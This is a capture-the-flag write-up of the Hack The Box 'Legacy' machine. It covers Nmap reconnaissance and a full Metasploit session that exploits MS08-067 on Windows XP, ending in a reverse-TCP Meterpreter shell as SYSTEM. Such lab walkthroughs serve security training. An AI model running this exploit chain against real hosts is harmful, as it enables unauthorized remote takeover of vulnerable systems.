---
tags:
  - ms08-067
group: Windows
---
![](https://labs.hackthebox.com/storage/avatars/5ca8f0c721a9eca6f1aeb9ff4b4bac60.png)

- Machine : https://app.hackthebox.com/machines/Legacy
- Reference : https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
- Solved : 2024.12.25. (Wed) (Takes 1day)

## Summary
---

1. **Initial Reconnaissance**
    - **Port Scanning**:
        - Quick scan revealed open ports: 135 (RPC), 139 (NetBIOS), 445 (SMB).
        - Detailed Nmap scan confirmed the target OS as `Windows XP` with SMB (`445`) enabled.
        - Host information:
            - NetBIOS Name: `LEGACY`
            - Workgroup: `HTB`
            - OS: Windows XP (Windows 2000 LAN Manager).
    - **SMB Enumeration**:
        - Attempted to list SMB shares using `smbclient`, but received `NT_STATUS_INVALID_PARAMETER`.

2. **Vulnerability Identification**
    - Used Nmap's `vuln` script to scan for vulnerabilities.
    - **MS08-067** (Microsoft Server Service Relative Path Stack Corruption) and **MS17-010** were identified as vulnerabilities.
    
3. **Exploitation**
    - **MS08-067 Exploit**:
        - Used `msfconsole` to exploit MS08-067:
            - Module: `exploit/windows/smb/ms08_067_netapi`.
            - Set `RHOSTS` to the target IP and `LHOST` to the attacker's IP.
            - Automatically detected the target as `Windows XP SP3 English`.
        - Exploit successfully executed, resulting in a `Meterpreter` session.
    
4. **Privilege Escalation**
    - Gained `NT AUTHORITY\SYSTEM` shell directly through the MS08-067 exploit.

### Key Techniques:

- **Enumeration**: Port and OS detection using Nmap and NetBIOS details.
- **Vulnerability Assessment**: Identified multiple vulnerabilities using Nmap scripts.
- **Exploitation**: Used Metasploit for automated exploitation of MS08-067.
- **Privilege Escalation**: Achieved SYSTEM-level access directly through the exploit.

---

# Reconnaissance

### Port Scanning

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.10.4 
Performing quick port scan on 10.10.10.4...
Found open ports: 135,139,445
Performing detailed scan on 10.10.10.4...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 03:31 EST
Nmap scan report for 10.10.10.4
Host is up (0.13s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m51s, median: 4d23h57m38s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:c8:d1 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-12-30T12:29:38+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.52 seconds
```

- rpc(135), smb(139,445) are open.
- The OS seems to be `Windows XP`

### smb(139,445)

```scss
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -L 10.10.10.4 
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_INVALID_PARAMETER
```

It doesn't allow listing shares.


# Shell as `SYSTEM`

Since the OS is `Windows XP` which is outdated and SMB is running, I suspect that this target might be vulnerable to `MS08-067` vulnerability.

Let's check it with `nmap`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nmap -p 445 -script vuln 10.10.10.4                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 03:34 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 49.05 seconds
```

It is vulnerable!
Let's try exploit with `msfconsole`.

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ msfconsole -q                      
msf6 > search MS08-067

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1     \_ target: Automatic Targeting                                 .                .      .      .
   2     \_ target: Windows 2000 Universal                              .                .      .      .
   3     \_ target: Windows XP SP0/SP1 Universal                        .                .      .      .
   4     \_ target: Windows 2003 SP0 Universal                          .                .      .      .
   5     \_ target: Windows XP SP2 English (AlwaysOn NX)                .                .      .      .
   6     \_ target: Windows XP SP2 English (NX)                         .                .      .      .
   7     \_ target: Windows XP SP3 English (AlwaysOn NX)                .                .      .      .
   8     \_ target: Windows XP SP3 English (NX)                         .                .      .      .
   9     \_ target: Windows XP SP2 Arabic (NX)                          .                .      .      .
   10    \_ target: Windows XP SP2 Chinese - Traditional / Taiwan (NX)  .                .      .      .
   11    \_ target: Windows XP SP2 Chinese - Simplified (NX)            .                .      .      .
   12    \_ target: Windows XP SP2 Chinese - Traditional (NX)           .                .      .      .
   13    \_ target: Windows XP SP2 Czech (NX)                           .                .      .      .
   14    \_ target: Windows XP SP2 Danish (NX)                          .                .      .      .
   15    \_ target: Windows XP SP2 German (NX)                          .                .      .      .
   16    \_ target: Windows XP SP2 Greek (NX)                           .                .      .      .
   17    \_ target: Windows XP SP2 Spanish (NX)                         .                .      .      .
   18    \_ target: Windows XP SP2 Finnish (NX)                         .                .      .      .
   19    \_ target: Windows XP SP2 French (NX)                          .                .      .      .
   20    \_ target: Windows XP SP2 Hebrew (NX)                          .                .      .      .
   21    \_ target: Windows XP SP2 Hungarian (NX)                       .                .      .      .
   22    \_ target: Windows XP SP2 Italian (NX)                         .                .      .      .
   23    \_ target: Windows XP SP2 Japanese (NX)                        .                .      .      .
   24    \_ target: Windows XP SP2 Korean (NX)                          .                .      .      .
   25    \_ target: Windows XP SP2 Dutch (NX)                           .                .      .      .
   26    \_ target: Windows XP SP2 Norwegian (NX)                       .                .      .      .
   27    \_ target: Windows XP SP2 Polish (NX)                          .                .      .      .
   28    \_ target: Windows XP SP2 Portuguese - Brazilian (NX)          .                .      .      .
   29    \_ target: Windows XP SP2 Portuguese (NX)                      .                .      .      .
   30    \_ target: Windows XP SP2 Russian (NX)                         .        <SNIP>

Interact with a module by name or index. For example info 82, use 82 or use exploit/windows/smb/ms08_067_netapi                                         
After interacting with a module you can manually set a TARGET with set TARGET 'Windows 2003 SP2 Turkish (NX)'                                           

msf6 > use 1
[*] Additionally setting TARGET => Automatic Targeting
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://doc
                                       s.metasploit.com/docs/using-metaspl
                                       oit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVS
                                       VC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
                                         thread, process, none)
   LHOST     192.168.45.131   yes       The listen address (an interface m
                                        ay be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176198 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.4:1032) at 2024-12-25 03:40:03 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

I got a SYSTEM's shell!